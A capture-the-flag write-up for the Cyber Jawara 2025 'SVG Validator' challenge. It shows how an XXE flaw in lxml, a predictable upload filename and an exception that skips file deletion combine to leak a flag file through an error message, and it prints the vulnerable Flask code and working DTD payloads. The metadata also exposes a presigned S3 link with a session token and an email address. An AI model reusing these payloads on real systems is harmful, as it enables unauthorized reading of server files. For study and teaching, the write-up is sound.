---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466S22QWTA4%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T123140Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDQaCXVzLXdlc3QtMiJGMEQCIBqP4OoOzaa%2B%2F9b%2BoRLIIO7O64GhXXS8SvTwgq74ZoWPAiAegF1d%2Bx84owwnIaqO4DQ6Qy7j81jhUHBe%2BgJW5ytE1CqIBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMGYohH04TNqRLvc6XKtwDy0pVJsQSYrQdgFGSr6qLStZc%2FQTAYPmPmma5pmmYGUFBenVXDh8mWpMhk2qlErsVmKLdGgdWQ7LiFqppkfA%2FQVLk62FZanrDDdQ6yrxINv7WyMWLi2OPUqOwscuv5q%2Fbo0soR8lQ7y5fpFZgC7SLI3c6%2FM7YUPZuwWmHN7BkaImNq2nNKMvhm1GFfFNcoItPYv1BXvXqj6ib5Jesj94P0J5rSwbJcmue6IC4la%2Bp9eGsuRnupJL1S2uu%2B3Po6LsunIYSjSrtvJj0tFdpdi1yVyQhk5eiyrt9qBzjK3SH7nGlpzvno3DSvGlMBut8naM8DdqPS%2B%2B1LoVY6Mkoj%2BBusfq%2BaP54vlF5u2rQEWak0BB1BVhCgFcSuvMlB2ypRp3cmUsjMmhAjdsMcjjI2YIBUX%2BXDEdSs2bOVr4Nnh%2B8vp3G%2B9DcEBuZpqSFd0osDOjR1%2B8rTKJ5oXX%2FN9hAihKf0%2FLj4Q0yI2PEVBiFzPN%2BzliDAhbuQRUBSRbiUM7vD3AqKOMubGzkLztceKOwFdLyrnxjNrD%2FO606KCniCl01%2B4h7i5oWhtnGIlE5zP%2F6O4GmMBFC%2Bv%2FJwqKdE7ugBmRa2C6Q5zoehUub5DeV%2BZuTuzq5%2BIyJj%2BgXX1aLcrIwyL7BwQY6pgGzF0f8EBKp6PjQHTreElAij21sk86%2FaoSLmBmRUmGJ8nO3bap5P39uIfr%2FKsKos7jXOZlgI0GsZUS0YKnzAV9ZXa28Q6kTyZ6VN5bQqLq1Bpmmte7pZMvwz0BZbdubU9HcyOCE9n4QlRo84gJac7gQ%2B1J7LKx43NPG6Sqa%2F%2F5ZnNR38iamENgcrF7NmBytK8XY3GH2E9QNtJY2x8z4DAlKg0p4V0BK\&X-Amz-Signature=15146b9600724a7808c6c3abcd417dd784418682820f617d04126d6539ee8f54\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
